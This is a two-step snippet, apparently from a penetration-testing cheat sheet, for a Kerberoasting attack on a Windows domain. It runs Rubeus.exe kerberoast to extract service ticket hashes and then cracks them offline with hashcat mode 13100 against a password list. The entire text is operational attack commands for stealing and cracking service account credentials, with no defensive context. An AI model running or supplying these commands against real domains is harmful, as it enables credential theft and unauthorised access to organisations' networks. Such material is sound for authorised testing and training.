Run the following in the domain controller, and then copy the hash
```CMD
Rubeus.exe kerberoast
```

Crack the hash using the following command
```Shell
hashcat -a 0 -m 13100 hash.txt Pass.txt
```